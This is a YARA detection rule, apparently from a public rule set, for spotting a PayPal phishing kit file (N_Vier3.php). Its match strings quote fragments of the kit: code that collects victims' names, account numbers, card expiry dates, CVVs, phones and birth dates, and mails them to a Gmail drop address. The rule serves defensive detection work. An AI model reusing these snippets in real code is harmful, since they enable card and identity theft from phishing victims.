rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_N_Vier3 {
  meta:
    description = "case127 - file N_Vier3.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara"
    date        = "2018-06-08"
    hash1       = "4a2b4e794a6719748601485e3befdccc7f4c39cb81a5677192aa78b633720c9d"

  strings:
    $s1  = "header(\"location: Congratulations.php?cmd=_account-details&session=\".md5(microtime()).\"&dispatch=\".sha1(microtime()));" fullword ascii
    $s2  = "mail(\"rezult277@gmail.com\", $subject, $message, $headers);" fullword ascii
    $s3  = "$message .= \"IP Geo       : http://www.geoiptool.com/?IP=\".$ip.\"  ====\\n\";" fullword ascii
    $s4  = "$message .= '|Numero de compte                       :  '.$_SESSION['accnum'].\"\\r\\n\";" fullword ascii
    $s5  = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
    $s6  = "$message .= '|Full name                :  '.$_SESSION['fname'].' '.$_SESSION['lname'].\"\\r\\n\";" fullword ascii
    $s7  = "$message .= '|Expiry date              :  '.$_POST['exdate'].\"\\r\\n\";" fullword ascii
    $s8  = "$message .= '|CVV                        :  '.$_POST['cvv'].\"\\r\\n\";" fullword ascii
    $s9  = "$message .= '|phone                :  '.$_SESSION['fnumber'].\"\\r\\n\";" fullword ascii
    $s10 = "$message .= '|date of birth               :  '.$_SESSION['dob'].\"\\r\\n\";" fullword ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 3KB and
      (all of them)
    ) or (all of them)
}